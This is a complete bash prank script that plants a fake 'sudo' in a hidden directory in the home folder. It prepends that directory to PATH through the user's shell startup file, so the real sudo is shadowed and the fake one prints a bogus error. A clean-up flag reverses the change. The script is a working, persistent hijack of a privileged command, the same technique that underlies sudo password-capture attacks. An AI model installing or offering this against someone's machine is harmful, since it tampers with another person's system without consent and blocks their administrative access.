#!/usr/bin/env bash
SHELL_CONFIG_FILE=""
FAKE_ERROR_MESSAGE="10d20d7815 EXCEPTION unknown \(0313\)"

spawn_evil_sudo() {
    evil_sudo_directory=~/.evil-sudo

    # create directory
    mkdir $evil_sudo_directory

    # create sudo file
    exec 3<>$evil_sudo_directory/sudo

    echo "# I am Evil Sudo" >&3
    echo "sleep 1" >&3
    echo "echo $FAKE_ERROR_MESSAGE" >&3

    exec 3>&-

    chmod +x $evil_sudo_directory/sudo

    # add evil sudo directory to path
    echo "PATH=$evil_sudo_directory:\$PATH #evil sudo" >>$SHELL_CONFIG_FILE

    echo 😈
}

clean_up() {
    # remove evil sudo directory
    rm -rf ~/.evil-sudo

    # remove directory from path
    sed -i '/evil sudo/d' $SHELL_CONFIG_FILE
}

set_shell_config_file() {
    if [[ $SHELL == *"zsh" ]]; then
        SHELL_CONFIG_FILE=~/.zshrc
    elif [ $SHELL == *"bash" ]; then
        SHELL_CONFIG_FILE=~/.bashrc
    else
        SHELL_CONFIG_FILE=~/.profile
    fi
}

set_shell_config_file

# Clean up if asked
if [ "$1" == "--clean" ] || [ "$1" == "-c" ]; then
    clean_up
    echo "🧹"
    exit
fi

if [ ! -z "$1" ]; then
    FAKE_ERROR_MESSAGE=$1
fi

clean_up
spawn_evil_sudo
